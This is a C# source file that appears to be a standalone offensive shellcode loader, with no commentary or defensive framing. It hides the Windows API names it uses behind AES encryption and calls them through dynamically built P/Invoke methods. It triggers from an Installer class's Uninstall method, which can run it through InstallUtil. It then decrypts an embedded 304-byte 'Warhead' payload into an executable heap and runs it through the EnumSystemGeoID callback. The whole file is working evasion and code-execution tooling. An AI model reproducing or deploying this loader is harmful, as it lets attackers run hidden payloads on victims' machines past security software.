using System;
using System.Configuration.Install;
using System.IO;
using System.Reflection;
using System.Reflection.Emit;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

[System.ComponentModel.RunInstaller(true)]
public class WarheadInstaller : Installer
{
    public override void Uninstall(System.Collections.IDictionary savedState)
    {
        Code.Main();
    }
}

public class Code
{
    static string GlobalKey = "RKrGO6wHY69Z6h7XlkGiv/A55kgkffvTFN2wjOQCt0A=";
    static string GlobalIV = "fDa1TK3ulGEE8sMJ9MYYdQ==";

    static byte[] dkernel32_dll_Bytes = new byte[16] { 0xED, 0x4F, 0x89, 0xAB, 0x4C, 0xE2, 0xEC, 0xD6, 0x31, 0x19, 0x5E, 0xD2, 0x07, 0xD4, 0x7A, 0xB3 };
    static string dkernel32_dll = DecryptAESAsString(dkernel32_dll_Bytes, GlobalKey, GlobalIV);

    static byte[] dHeapCreate_Bytes = new byte[16] { 0xC6, 0xC9, 0x1D, 0xB3, 0x2D, 0xB7, 0x7B, 0x31, 0x43, 0x85, 0xE2, 0xC7, 0x41, 0x25, 0x73, 0x6C };
    static string dHeapCreate = DecryptAESAsString(dHeapCreate_Bytes, GlobalKey, GlobalIV);

    static byte[] dHeapAlloc_Bytes = new byte[16] { 0xFC, 0xAF, 0x0F, 0xF9, 0xF1, 0x78, 0xDA, 0x22, 0xC8, 0x3C, 0x5E, 0x43, 0xB8, 0xE2, 0x1F, 0x54 };
    static string dHeapAlloc = DecryptAESAsString(dHeapAlloc_Bytes, GlobalKey, GlobalIV);

    static byte[] dHeapFree_Bytes = new byte[16] { 0x48, 0x26, 0xA0, 0x62, 0x66, 0x61, 0x10, 0x44, 0x19, 0x15, 0xE7, 0x04, 0x50, 0x92, 0xC7, 0x5E };
    static string dHeapFree = DecryptAESAsString(dHeapFree_Bytes, GlobalKey, GlobalIV);

    static byte[] dEnumSystemGeoID_Bytes = new byte[16] { 0xB7, 0x19, 0x55, 0x78, 0xF9, 0x5E, 0x30, 0xF5, 0xE1, 0x14, 0xC7, 0x17, 0x17, 0xB9, 0xBC, 0xD2 };
    static string dEnumSystemGeoID = DecryptAESAsString(dEnumSystemGeoID_Bytes, GlobalKey, GlobalIV);

    public static object DynamicInvoke(Type returnType, string library, string methodName, object[] argumentTypes, Type[] parameterTypes)
    {
        var assemblyName = new AssemblyName("DynamicAssembly");
        var assemblyBuilder = AppDomain.CurrentDomain.DefineDynamicAssembly(assemblyName, AssemblyBuilderAccess.Run);
        var moduleBuilder = assemblyBuilder.DefineDynamicModule("DynamicModule");

        var methodBuilder = moduleBuilder.DefinePInvokeMethod(
            methodName,
            library,
            MethodAttributes.Public | MethodAttributes.Static | MethodAttributes.PinvokeImpl,
            CallingConventions.Standard,
            returnType,
            parameterTypes,
            CallingConvention.Winapi,
            CharSet.Ansi
        );

        methodBuilder.SetImplementationFlags(methodBuilder.GetMethodImplementationFlags() | MethodImplAttributes.PreserveSig);
        moduleBuilder.CreateGlobalFunctions();
        MethodInfo dynamicMethod = moduleBuilder.GetMethod(methodName);

        return dynamicMethod.Invoke(null, argumentTypes);
    }

    public static IntPtr HeapCreate(uint flOptions, UIntPtr dwInitialSize, UIntPtr dwMaximumSize)
    {
        var parameterTypes = new Type[] { typeof(uint), typeof(UIntPtr), typeof(UIntPtr) };
        var arguments = new object[] { flOptions, dwInitialSize, dwMaximumSize };

        return (IntPtr)DynamicInvoke(typeof(IntPtr), dkernel32_dll, dHeapCreate, arguments, parameterTypes);
    }

    public static IntPtr HeapAlloc(IntPtr hHeap, uint dwFlags, UIntPtr dwBytes)
    {
        var parameterTypes = new Type[] { typeof(IntPtr), typeof(uint), typeof(UIntPtr) };
        var arguments = new object[] { hHeap, dwFlags, dwBytes };

        return (IntPtr)DynamicInvoke(typeof(IntPtr), dkernel32_dll, dHeapAlloc, arguments, parameterTypes);
    }

    public static bool HeapFree(IntPtr hHeap, uint dwFlags, IntPtr lpMem)
    {
        var parameterTypes = new Type[] { typeof(IntPtr), typeof(uint), typeof(IntPtr) };
        var arguments = new object[] { hHeap, dwFlags, lpMem };

        return (bool)DynamicInvoke(typeof(bool), dkernel32_dll, dHeapFree, arguments, parameterTypes);
    }

    public static bool EnumSystemGeoID(int GeoClass, int ParentGeoId, IntPtr lpGeoEnumProc)
    {
        var parameterTypes = new Type[] { typeof(int), typeof(int), typeof(IntPtr) };
        var arguments = new object[] { GeoClass, ParentGeoId, lpGeoEnumProc };
        bool result = (bool)DynamicInvoke(typeof(bool), dkernel32_dll, dEnumSystemGeoID, arguments, parameterTypes);
        return result;
    }

    public static void Main()
    {

        byte[] Warhead_Bytes = new byte[304] { 0x4C, 0x1E, 0x97, 0x81, 0xBC, 0xCD, 0x36, 0x58, 0x72, 0xCF, 0x42, 0x97, 0x7B, 0x5C, 0x81, 0x9B, 0x44, 0x43, 0x03, 0x2D, 0x81, 0xF1, 0x2F, 0x14, 0xA8, 0xD8, 0xB6, 0x13, 0x1F, 0x03, 0xC0, 0xC9, 0x06, 0x45, 0xE6, 0x0D, 0x00, 0x2A, 0x77, 0xFE, 0x0A, 0xC0, 0x51, 0xF1, 0x93, 0x0C, 0x5E, 0x6E, 0x1B, 0xC9, 0x2F, 0x6D, 0xD4, 0x10, 0xDD, 0x2F, 0x75, 0x9A, 0xB5, 0x5B, 0x22, 0x7C, 0x52, 0xD2, 0xB8, 0xC7, 0x9B, 0x02, 0xAC, 0x7E, 0xBF, 0x68, 0x83, 0xF9, 0xBB, 0x82, 0xD1, 0x65, 0xFC, 0xEB, 0x7C, 0xDB, 0xC8, 0x92, 0xFB, 0x53, 0x57, 0xA6, 0x54, 0x3B, 0x35, 0x5A, 0x38, 0x80, 0x61, 0x55, 0xE2, 0xC8, 0xDD, 0xDA, 0x14, 0x33, 0xB5, 0x4B, 0xB8, 0x34, 0xAE, 0x1C, 0x1D, 0x7C, 0xA9, 0x48, 0x9E, 0xB3, 0xAE, 0x5E, 0x6F, 0xD3, 0xA4, 0xA7, 0x9B, 0x78, 0xB2, 0x78, 0x3A, 0xF2, 0xFD, 0xE8, 0x52, 0xD0, 0x9B, 0xB6, 0x02, 0x8B, 0xEE, 0xA9, 0xEF, 0x63, 0xE3, 0x1F, 0xFA, 0x2A, 0x85, 0x01, 0xF3, 0xA5, 0x3D, 0xD7, 0x55, 0x79, 0x4F, 0xB4, 0xAE, 0x8A, 0x4D, 0x43, 0x27, 0x6D, 0xB3, 0xBA, 0x73, 0x6A, 0x2C, 0xCF, 0xA6, 0x03, 0x7B, 0x40, 0xC1, 0xFE, 0xDA, 0x6C, 0x33, 0x59, 0xD5, 0x3E, 0xC5, 0xBD, 0x86, 0xCF, 0x76, 0xC1, 0xF0, 0xF1, 0x5A, 0x3F, 0x39, 0x92, 0xD7, 0xBA, 0x5F, 0xDA, 0xD8, 0x81, 0x78, 0xF6, 0x30, 0x18, 0x70, 0xA2, 0x04, 0x44, 0xD7, 0xA1, 0xFE, 0xED, 0x9E, 0xB6, 0x29, 0xAB, 0x7F, 0x9E, 0x77, 0xF5, 0xDA, 0x14, 0x7D, 0xB5, 0xDA, 0x42, 0x8A, 0xB2, 0x9F, 0x36, 0x70, 0xC5, 0x72, 0x13, 0x1D, 0x9C, 0xB6, 0xA2, 0xC2, 0x66, 0xE8, 0xE7, 0x84, 0xEB, 0x03, 0x46, 0x8D, 0x79, 0xB8, 0x28, 0x02, 0x09, 0xAB, 0xCB, 0xCC, 0x61, 0x30, 0xBA, 0xE7, 0x41, 0x23, 0x43, 0xC1, 0xBD, 0x02, 0xE2, 0xAB, 0x67, 0xAC, 0xB2, 0xC7, 0xC4, 0x56, 0x32, 0x67, 0x37, 0xBE, 0x18, 0x99, 0x8A, 0x59, 0x98, 0x0C, 0x8E, 0xA8, 0xFE, 0xAA, 0x29, 0xC9, 0x99, 0x2C, 0x1F, 0x63, 0x7D, 0x5C, 0x32, 0x9E, 0x37, 0xC2, 0xAE, 0xCE, 0x40, 0x77, 0xB9, 0x28, 0x86, 0x83, 0x6B, 0x3F, 0xDF };
        byte[] Warhead = DecryptAESAsBytes(Warhead_Bytes, "MeV1w5NXp6srqE5/qDN0lSLfu9J4opVHRcoYR1mmBzk=", "hTFZdUSVkNnMMRnI5uG36A==");

        IntPtr heapHandle = HeapCreate(0x00040000, (UIntPtr)0x1000, UIntPtr.Zero);
        IntPtr Address = HeapAlloc(heapHandle, 0x00000008, (UIntPtr)Warhead.Length);
        Marshal.Copy(Warhead, 0, Address, Warhead.Length);
        EnumSystemGeoID(0, 0, Address);
        HeapFree(heapHandle, 0, Address);
    }

    static string DecryptAESAsString(byte[] data, string keyBase64, string ivBase64)
    {
        byte[] decryptedBytes = DecryptAESAsBytes(data, keyBase64, ivBase64);
        return Encoding.UTF8.GetString(decryptedBytes);
    }

    static byte[] DecryptAESAsBytes(byte[] data, string keyBase64, string ivBase64)
    {
        byte[] key = Convert.FromBase64String(keyBase64);
        byte[] iv = Convert.FromBase64String(ivBase64);

        using (Aes aes = Aes.Create())
        {
            aes.Key = key;
            aes.IV = iv;

            using (ICryptoTransform decryptor = aes.CreateDecryptor(aes.Key, aes.IV))
            using (MemoryStream memoryStream = new MemoryStream(data))
            using (CryptoStream cryptoStream = new CryptoStream(memoryStream, decryptor, CryptoStreamMode.Read))
            {
                byte[] decryptedBytes = new byte[data.Length];
                int decryptedByteCount = cryptoStream.Read(decryptedBytes, 0, decryptedBytes.Length);

                byte[] result = new byte[decryptedByteCount];
                Array.Copy(decryptedBytes, result, decryptedByteCount);
                return result;
            }
        }
    }
}
